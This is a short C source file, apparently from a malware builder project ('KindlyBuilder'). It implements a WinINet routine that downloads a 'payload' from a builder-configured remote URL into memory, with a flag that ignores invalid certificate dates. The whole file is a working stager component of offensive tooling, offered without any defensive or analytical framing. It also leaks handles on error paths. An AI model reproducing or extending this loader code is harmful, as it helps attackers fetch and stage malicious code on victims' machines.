//
// Created by scrub on 9/19/2024.
//
#include <windows.h>
#include "../../KindlyBuilder.h"
#include <wininet.h>
#include <stdio.h>

BOOL HttpDownloadPayload(IN DWORD dwPayloadSize, OUT PVOID *pOutBuffer, OUT PDWORD dwBytesWritten) {
    HINTERNET hInternet = NULL;
    HINTERNET hInternetFile = NULL;
    PBYTE pBytes;
    DWORD dwBytesRead;

    hInternet = InternetOpenW(NULL, 0, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %lu \n", GetLastError());
        return FALSE;
    }

    // Opening a handle to the payload's URL
    hInternetFile = InternetOpenUrlW(hInternet, Builder->RemotePayloadURL, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %lu \n", GetLastError());
        return FALSE;
    }

    // Allocating a buffer for the payload
    pBytes = (PBYTE)LocalAlloc(LPTR, dwPayloadSize);

    // Reading the payload
    if (!InternetReadFile(hInternetFile, pBytes, dwPayloadSize, &dwBytesRead)) {
        printf("[!] InternetReadFile Failed With Error : %lu \n", GetLastError());
        return FALSE;
    }

    *pOutBuffer = pBytes;
    *dwBytesWritten = dwPayloadSize;

    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);


    return TRUE;
}